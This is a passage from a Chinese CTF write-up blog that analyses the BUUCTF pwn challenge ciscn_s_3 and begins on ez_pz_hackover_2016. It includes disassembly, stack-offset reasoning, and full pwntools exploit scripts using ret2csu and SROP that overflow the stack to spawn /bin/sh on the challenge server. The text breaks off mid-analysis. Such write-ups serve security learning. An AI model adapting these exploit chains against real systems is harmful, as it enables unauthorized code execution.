checksec ./ciscn_s_3         </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/ciscn_s_3&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>本地执行，程序会等待用户输入数据，并将数据打印出来，随后会输出乱码并报段错误终止程序，其中乱码每次执行结果均不一样。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./ciscn_s_3         </span><br><span class="line">h-t-m myr520</span><br><span class="line">h-t-m myr520</span><br><span class="line">�����6@�����zsh: segmentation fault  ./ciscn_s_3</span><br><span class="line"></span><br><span class="line">└─$ ./ciscn_s_3</span><br><span class="line">h-t-m myr520</span><br><span class="line">h-t-m myr520</span><br><span class="line">pé$�6@�ĩ$�zsh: segmentation fault  ./ciscn_s_3</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译，主函数仅调用 <kbd>vuln()</kbd> 函数，该函数汇编代码如下，存在明显栈溢出，其使用的 <kbd>sys_read</kbd> 与 <kbd>sys_write</kbd> 均为系统调用。值得注意的是，函数直接通过 <kbd>retn</kbd> 提前退出了，因此栈溢出时将不必考虑 <kbd>rbp</kbd> 的位置。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h       ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">mov     rax, 1</span><br><span class="line">mov     edx, 30h ; &#x27;0&#x27;  ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_write</span><br><span class="line">retn</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">db 90h</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>程序内容十分简洁，函数以及各字符串全在下图中，没有危险套装，而且直接系统调用，因此也无法使用 <kbd>ret2libc</kbd>。有意思的是观察代码可知函数运行过程中 <kbd>rbp</kbd>、<kbd>rsp</kbd> 值一直都相等。</p><img src="0010.webp" alt="" style="zoom:75%"></li><li><p>此前在 <a href="#others_shellcode">others_shellcode</a> 中遇到过系统调用，在 <kbd>32</kbd> 位程序中系统调用会先将系统调用号传入 <kbd>eax</kbd> 寄存器，然后将参数从左到右依次存入 <kbd>ebx</kbd>、<kbd>ecx</kbd>、<kbd>edx</kbd> 寄存器中，最后通过 <kbd>int 80h</kbd> 中断即可进行系统调用，而返回值则存在 <kbd>eax</kbd> 寄存器。而本题为 <kbd>64</kbd> 位环境，系统调用方式略有不同，首先调用号会放入 <kbd>rax</kbd> 寄存器中，参数依次放入 <kbd>rdi</kbd>、<kbd>rsi</kbd>、<kbd>rdx</kbd> 寄存器中，返回值存在 <kbd>eax</kbd> 寄存器。最关键的，其使用 <kbd>syscall</kbd> 进行系统调用。在 <kbd>IDA</kbd> 中还存在一个 <kbd>gadgets()</kbd> 函数，看名字可以知道会给我们提供一些 <kbd>gadget</kbd>，其汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">mov     rax, 0Fh</span><br><span class="line">retn</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">retn</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">db 90h</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>该函数存在两个对 <kbd>rax</kbd> 寄存器的赋值操作并自带 <kbd>retn</kbd>，只需接上 <kbd>syscall</kbd> 即可完成对应系统调用。其中 <kbd>0x0F</kbd> 对应 <kbd>rt_sigreturn</kbd> 函数，而 <kbd>0x3B</kbd> 则对应 <kbd>execve</kbd> 函数，由这两个系统调用可知本题可使用两种方式解决。</p></li></ul><h3 id="ret2csu">ret2csu</h3><ul><li><p>最熟悉的当然是利用 <kbd>execve</kbd> 函数来执行 <kbd>/bin/sh</kbd> 来获取 Shell，虽然程序中并没有现成的字符串拿来用，但是我们可以通过程序读取输入来将危险字符串存入栈中，然后获取栈地址便可。至于如何获得栈地址，还记得本地运行时的乱码，那是由于程序超额输出的缘故，局部变量占用空间为 <kbd>0x10</kbd> 字节，而程序输出了 <kbd>0x30</kbd> 字节，根据函数调用规则，程序输出的 <kbd>0x10</kbd> 字节数据后紧随的 <kbd>8</kbd> 字节数据便是旧的 <kbd>rbp</kbd> 地址，该地址与函数变量的栈地址偏移不变，因此可获取此地址后计算得到危险字符串的地址。本地调试栈中数据如下图所示，此时栈中的 <kbd>rbp</kbd> 位要留作后续返回操作，所幸 <kbd>vuln()</kbd> 函数刚调用，因此可以继续往下走 <kbd>0x10</kbd> 便是更早的 <kbd>rbp</kbd>。</p><img src="0011.webp" alt="" style="zoom:75%"><p>由图可知该地址到危险字符处的偏移为 <kbd>0x7fffffffe548</kbd> - <kbd>0x7fffffffe430</kbd> = <kbd>0x118</kbd>。据此就可以构造部分 <kbd>exp</kbd> 来获取 <kbd>/bin/sh</kbd> 的地址了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,27022)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ED</span></span><br><span class="line">payload = (<span class="string">b&quot;/bin/sh&quot;</span>).ljust(<span class="number">16</span>,<span class="string">b&#x27;\0&#x27;</span>) + p64(vuln_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">bin_sh = u64(io.recv()[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br></pre></td></tr></table></figure></li><li><p>接下来就该传参调用 <kbd>execve</kbd> 函数了，该函数有三个参数，函数原型如下：</p><blockquote><p>int execve(const char *filename, char *const argv[], char *const envp[]);</p><p><strong>filename</strong>：用于指定要运行的程序的文件名，/bin/sh 即执行 sh</p><p><strong>argv</strong>：程序的运行参数</p><p><strong>envp</strong>：程序的环境变量</p></blockquote><p>因此我们实际需要执行的操作为 <kbd>execve(/bin/sh,NULL,NULL)</kbd>，这三个参数需要分别传入 <kbd>rdi</kbd>、<kbd>rsi</kbd>、<kbd>rdx</kbd> 三个寄存器中。这一步挺熟的了，找 <kbd>gadget</kbd> 嘛。不过，实测程序中并不含 <kbd>pop rdx</kbd> 操作，因此依靠 <kbd>gadget</kbd> 一步写入显然是不行了。不过一步不行，可以两步，这里就不得不介绍一下大部分程序都会内置的初始化函数 <kbd>&#95;&#95;libc&#95;csu&#95;init</kbd>，此前十分常用的 <kbd>pop rdi</kbd> + <kbd>retn</kbd> 的操作就是截取于此，有问题找它就行，以下是该函数完整汇编代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">        push    r15</span><br><span class="line">        push    r14</span><br><span class="line">        mov     r15d, edi</span><br><span class="line">        push    r13</span><br><span class="line">        push    r12</span><br><span class="line">        lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">        push    rbp</span><br><span class="line">        lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">        push    rbx</span><br><span class="line">        mov     r14, rsi</span><br><span class="line">        mov     r13, rdx</span><br><span class="line">        sub     rbp, r12</span><br><span class="line">        sub     rsp, 8</span><br><span class="line">        sar     rbp, 3</span><br><span class="line">        call    _init_proc</span><br><span class="line">        test    rbp, rbp</span><br><span class="line">        jz      short loc_400596</span><br><span class="line">        xor     ebx, ebx</span><br><span class="line">        nop     dword ptr [rax+rax+00000000h]</span><br><span class="line"></span><br><span class="line">loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">        mov     rdx, r13</span><br><span class="line">        mov     rsi, r14</span><br><span class="line">        mov     edi, r15d</span><br><span class="line">        call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">        add     rbx, 1</span><br><span class="line">        cmp     rbx, rbp</span><br><span class="line">        jnz     short loc_400580</span><br><span class="line"></span><br><span class="line">loc_400596:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">        add     rsp, 8</span><br><span class="line">        pop     rbx</span><br><span class="line">        pop     rbp</span><br><span class="line">        pop     r12</span><br><span class="line">        pop     r13</span><br><span class="line">        pop     r14</span><br><span class="line">        pop     r15</span><br><span class="line">        retn</span><br></pre></td></tr></table></figure><p>可以看到第 <kbd>22</kbd>、<kbd>23</kbd> 行使用 <kbd>mov</kbd> 指令为 <kbd>rdx</kbd> 与 <kbd>rsi</kbd> 寄存器赋值，现在只需让 <kbd>r13</kbd> 与 <kbd>r14</kbd> 中的值为零即可，至于如何置零，就可以使用第 <kbd>35</kbd>、<kbd>36</kbd> 两行从栈从为其赋值为零。还需要注意的一点是，这串 <kbd>gadget</kbd> 完成对 <kbd>rsi</kbd> 的赋值之后会继续运行，并在 <kbd>rbp</kbd> 与 <kbd>rbp</kbd> 相等的情况下将陷入循环，不过在此之前程序还 <kbd>call</kbd> 了一个地址，并且该地址依然可控，只需令 <kbd>rbx</kbd> 为零，就能通过 <kbd>r12</kbd> 控制其继续去往任何地方！</p></li><li><p>因此，通过栈溢出跳转至上述末尾这六个 <kbd>pop</kbd> 操作，就可在栈中逐个安排这些寄存器，并且随后跳转至 <kbd>loc_400580</kbd> 进一步完成传参。至于 <kbd>rdi</kbd> 的赋值，老朋友了，直接 <kbd>ROPgadget</kbd> 找即可。值得注意的是，此前获得 <kbd>/bin/sh</kbd> 栈地址后返回占用的是 <kbd>rbp</kbd> 位，而程序返回后会先进行 <kbd>push rbp</kbd> 操作，抵消了 <kbd>ret</kbd> 指令的出栈操作，即再次返回 <kbd>vuln()</kbd> 函数时栈空间与此前完全一致。因此需注意填充字符串必须为 <kbd>/bin/sh</kbd>，万不可用其他垃圾数据来覆盖。此外，关于 <kbd>call</kbd> 指令的目标地址为什么是 <kbd>bin&#95;sh+0x50</kbd> 这一点，对栈分析可知填充完数据后该地址正好存的就是 <kbd>pop&#95;rdi&#95;ret</kbd> 的地址。由于 <kbd>call</kbd> 指令本身可以等价于执行<strong>压栈</strong>操作后再执行 <kbd>jmp</kbd> 至目标地址的操作，因此其并不会直接执行栈中数据，而是跳转至栈中存储的地址所指向的位置。当然我们还需要一条命令来清理一下栈中突然多出来的数据，而正好 <kbd>pop&#95;rdi&#95;ret</kbd> 完美符合，复用得非常巧妙。综上构造 <kbd>payload</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pop6_ret = <span class="number">0x40059A</span></span><br><span class="line">mov2_addr = <span class="number">0x400580</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005A3</span></span><br><span class="line">mov_rax = <span class="number">0x4004E2</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">b&quot;/bin/sh&quot;</span>).ljust(<span class="number">16</span>,<span class="string">b&#x27;\0&#x27;</span>)      <span class="comment"># 恢复栈中 /bin/sh 字符串</span></span><br><span class="line">payload2 += p64(pop6_ret)        <span class="comment"># 溢出至六次 pop 处</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) * <span class="number">2</span>           <span class="comment"># rbx 设为零，rbp 也可直接设为零</span></span><br><span class="line">payload2 += p64(bin_sh + <span class="number">0x50</span>)   <span class="comment"># 设置 call 目标为 pop_rdi_ret</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) * <span class="number">3</span>           <span class="comment"># r13、r14、r15 均设为零</span></span><br><span class="line">payload2 += p64(mov2_addr)       <span class="comment"># 将 rdx、rsi 赋值为零</span></span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(bin_sh)   <span class="comment"># 将 /bin/sh 所在地址存入 rdi</span></span><br><span class="line">payload2 += p64(mov_rax)         <span class="comment"># 跳转到设置 rax 为 0xF 处</span></span><br><span class="line">payload2 += p64(syscall_addr)    <span class="comment"># 中断，开始系统调用</span></span><br></pre></td></tr></table></figure></li><li><p>当然我们也可以使用 <kbd>/bin/sh</kbd> 字符串后面那块被填了垃圾字符的空间来写入随便哪个 <kbd>pop</kbd> + <kbd>ret</kbd> 操作的地址，这样 <kbd>call</kbd> 的目标就可以用 <kbd>bin&#95;sh+0x8</kbd> 了，实现方法放在如下完整 <kbd>exp</kbd> 中，哦对，笔者也是做完才知道，这个方法的名字叫 <kbd>ret2csu</kbd>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29761</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ED</span></span><br><span class="line">payload = (<span class="string">b&quot;/bin/sh&quot;</span>).ljust(<span class="number">16</span>,<span class="string">b&#x27;\0&#x27;</span>) + p64(vuln_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">bin_sh = u64(io.recv()[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">pop6_ret = <span class="number">0x40059A</span></span><br><span class="line">mov2_addr = <span class="number">0x400580</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005A3</span></span><br><span class="line">mov_rax = <span class="number">0x4004E2</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;/bin/sh\x00&quot;</span>        <span class="comment"># 恢复栈中 /bin/sh 字符串</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)     <span class="comment"># 留用，抵消 call</span></span><br><span class="line">payload2 += p64(pop6_ret)        <span class="comment"># 溢出至六次 pop 处</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) * <span class="number">2</span>           <span class="comment"># rbx 设为零，rbp 也可直接设为零</span></span><br><span class="line">payload2 += p64(bin_sh + <span class="number">0x8</span>)    <span class="comment"># 设置 call 目标为 pop_rdi_ret</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) * <span class="number">3</span>           <span class="comment"># r13、r14、r15 均设为零</span></span><br><span class="line">payload2 += p64(mov2_addr)       <span class="comment"># 将 rdx、rsi 赋值为零</span></span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(bin_sh)      <span class="comment"># 将 /bin/sh 所在地址存入 rdi</span></span><br><span class="line">payload2 += p64(mov_rax)         <span class="comment"># 跳转到设置 rax 为 0xF 处</span></span><br><span class="line">payload2 += p64(syscall_addr)    <span class="comment"># 中断，开始系统调用</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h3 id="SROP">SROP</h3><ul><li><p>本题的另一种解法就是利用 <kbd>gadgets()</kbd> 函数中另一个系统调用号 <kbd>0xF</kbd> 对应的 <kbd>rt_sigreturn</kbd>。这里就要涉及到类 UNIX 系统的 <kbd>signal</kbd> 机制了，其大致流程如下：</p><img src="0012.webp" alt="" style="zoom:75%"><p>内核向程序发起一个 <kbd>signal</kbd>，进程就会被暂时挂起，内核会将进程上下文保存至进程的栈空间中，并在栈顶填上 <kbd>rt_sigreturn</kbd> 的地址，我们将这块数据称为 <kbd>Signal Frame</kbd>。当 <kbd>Signal Handler</kbd> 处理完之后内核就会从栈空间中恢复进程上下文，值得注意的是这一步操作中内核并不会管你的 <kbd>Signal Frame</kbd> 从哪里来的。因此只需伪造一个顶部带 <kbd>rt_sigreturn</kbd> 的地址的 <kbd>Signal Frame</kbd> 即可将进程恢复至我们指定的状态，<kbd>Signal Frame</kbd> 结构如下图所示：</p><img src="0013.webp" alt="" style="zoom:75%"><p>在相应位置放上执行 <kbd>execve(&#39;/bin/sh&#39;,0,0)</kbd> 的数据，待执行系统调用 <kbd>rt_sigreturn</kbd> 之后程序便会交出 Shell。此外，<kbd>pwntools</kbd> 中已经集成了构造 <kbd>Signal Frame</kbd> 的攻击，因此可以十分轻松地完成 SROP 攻击。</p></li><li><p>如下为完整 <kbd>exp</kbd>，值得注意的是这次获取栈地址后直接跳转到了读取操作而非 <kbd>vuln()</kbd> 函数起始位置，这样实际上就是跳过了开头的 <kbd>push</kbd> 操作而已，不过由于对栈的操作整体后移了 <kbd>8</kbd> 个字节，因此再次写入 <kbd>payload</kbd> 时将不用担心覆盖 <kbd>/bin/sh</kbd> 字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">read_addr = <span class="number">0x4004F1</span></span><br><span class="line">payload = (<span class="string">b&quot;/bin/sh&quot;</span>).ljust(<span class="number">16</span>,<span class="string">b&#x27;\0&#x27;</span>) + p64(read_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">bin_sh = u64(io.recv()[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">mov_rax = <span class="number">0x4004DA</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = bin_sh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload2 += p64(mov_rax) + p64(syscall_addr)</span><br><span class="line">payload2 += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="ez-pz-hackover-2016">ez_pz_hackover_2016</h2><ul><li><p>先验文件，本题文件为 <kbd>32</kbd> 为可执行文件，仅开启 <kbd>Full RELRO</kbd>，即整个 GOT 表均为只读。竟然连 NX 保护都不开，也因此程序存在可读写可执行空间。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./ez_pz_hackover_2016</span><br><span class="line">./ez_pz_hackover_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=341701ef5091cd200a5fc401bc3a826e3d131086, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ./ez_pz_hackover_2016 </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/ez_pz_hackover_2016&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>本地执行一下，程序打印了一段应该是地址的值并等待用户输入姓名，随后输出姓名并退出程序，{甚至还有个 LOGO}。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./ez_pz_hackover_2016 </span><br><span class="line"></span><br><span class="line">             ___ ____</span><br><span class="line">      ___ __| _ \_  /</span><br><span class="line">     / -_)_ /  _// / </span><br><span class="line">     \___/__|_| /___|</span><br><span class="line">        lemon squeezy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yippie, lets crash: 0xffe459fc</span><br><span class="line">Whats your name?</span><br><span class="line">&gt; h-t-m myr520</span><br><span class="line"></span><br><span class="line">Welcome h-t-m myr520!</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译，程序的主体功能的实现位于 <kbd>chall()</kbd> 函数中，稍微审计代码可知程序起始时打印的地址为局部变量数组 <kbd>s</kbd> 的首地址。在数据输入的实现中，可接收字符数小于局部变量所占用的空间，因此此处没有栈溢出漏洞。而在后续实现中，程序在完成数据打印前，还将读入数据末尾的换行符替换为空字符，这样他就是标准的字符串了。并且在打印完成后将其与内部字符串 <kbd>crashme</kbd> 作比较，若相等即可进入 <kbd>vuln()</kbd> 函数。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">chall</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-40Ch] BYREF</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">1023</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(s, <span class="number">10</span>, v0);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, s);</span><br><span class="line">  result = (<span class="keyword">void</span> *)<span class="built_in">strcmp</span>(s, <span class="string">&quot;crashme&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> vuln((<span class="keyword">int</span>)s, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><kbd>vuln()</kbd> 函数老熟人了，如此命名的必是重点，查看伪代码发现该函数仅仅将字符数组 <kbd>s</kbd> 复制进其局部变量 <kbd>dest</kbd> 中而已。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__cdecl <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> src, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过，由于这里的局部变量仅占用 <kbd>50</kbd> 字节空间，而传入的数据被允许为最大 <kbd>1023</kbd> 字节的字符串，因此只要绕过与 <kbd>strcmp()</kbd> 的对比即可在此处完成栈溢出。而 <kbd>strcmp()</kbd> 函数的绕过只需数据以内部字符串加空字符为开头即可，毕竟其只对比空字符之前的数据。</p></li><li><p>在 <kbd>IDA</kbd> 中依然没找着危险套装，不过既然程序的栈空间没有开保护，甚至于开头就输出了一个栈地址，因此我们完全可以直接把 <kbd>shellcode</kbd> 写在栈里并且通过计算偏移锁定其然后执行，完美。先本地调试一下，把栈中的各偏移算清楚，下图为 <kbd>memcpy()</kbd> 函数传参后的栈空间内状态。</p><img src="0014.webp" alt="" style="zoom:75%"><p>由图可知，<kbd>vuln()</kbd> 函数的局部变量 <kbd>dest</kbd> 